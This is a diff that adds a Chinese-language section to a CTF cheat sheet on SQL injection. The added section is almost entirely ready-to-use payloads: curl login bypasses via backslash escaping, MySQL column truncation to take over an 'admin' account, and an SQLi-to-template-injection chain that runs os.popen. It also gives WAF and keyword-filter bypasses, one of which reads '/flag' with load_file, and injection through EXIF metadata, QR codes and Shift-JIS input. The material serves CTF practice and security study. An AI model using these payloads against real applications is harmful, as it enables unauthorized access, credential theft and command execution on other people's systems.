@@ -556,3 +556,76 @@ EXEC xp_cmdshell 'whoami'
 -- PostgreSQL查询系统表pg_tables（替代information_schema）
 1' AND (SELECT 1 FROM pg_tables WHERE tablename LIKE 'user%')--+
 ```
+
+---
+
+## 来自外部导入内容 (CTF Web - server-side.md SQLi 部分)
+
+### 反斜杠转义引号绕过
+
+```bash
+# 查询: SELECT * FROM users WHERE username='$user' AND password='$pass'
+# 用户名=\ : WHERE username='\' AND password='...'
+curl -X POST http://target/login -d 'username=\&password= OR 1=1-- '
+curl -X POST http://target/login -d 'username=\&password=UNION SELECT value,2 FROM flag-- '
+```
+
+### 十六进制编码绕过引号
+
+```sql
+SELECT 0x6d656f77;  -- 返回 'meow'
+```
+
+### 二次SQL注入
+
+注册时注入SQL，在个人资料查看时触发。
+
+### MySQL 列截断 (VolgaCTF 2014)
+
+```bash
+# VARCHAR(20) 列 — 填充 "admin" (5字符) 超过列宽
+curl -X POST http://target/register -d \
+  'login=admin%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20x&password=attacker123'
+```
+
+### SQLi 到 SSTI 链
+
+当 SQLi 结果在模板中渲染时:
+```python
+payload = "{{self.__init__.__globals__.__builtins__.__import__('os').popen('/readflag').read()}}"
+hex_payload = '0x' + payload.encode().hex()
+```
+
+### WAF 绕过通过 XML 实体编码 (Crypto-Cat)
+
+```xml
+<storeId>
+  1 &#x55;&#x4e;&#x49;&#x4f;&#x4e; &#x53;&#x45;&#x4c;&#x45;&#x43;&#x54; username &#x46;&#x52;&#x4f;&#x4d; users
+</storeId>
+```
+
+### SQLi 通过 EXIF 元数据注入 (29c3 CTF 2012)
+
+```bash
+exiftool -Comment="' UNION SELECT password FROM users--" image.jpg
+```
+
+### Shift-JIS 编码 SQL 注入 (Boston Key Party 2016)
+
+```javascript
+socket.send('{"type":"get_answer","answer":"\\u00a5\\" OR 1=1 -- "}')
+```
+
+### SQL 注入通过 QR 码输入 (H4ckIT CTF 2016)
+
+```python
+import qrcode
+payload = "'\tunion\tselect\tsecret_field\tfrom\tmessages\twhere\tsecret_field\tlike\t'%flag%"
+img = qrcode.make(payload)
+```
+
+### SQL 双关键字过滤器绕过 (DefCamp CTF 2016)
+
+```text
+), ((selselectect * frofromm (seselectlect load_load_filefile('/flag')) as a limit 0, 1), '2') #
+```
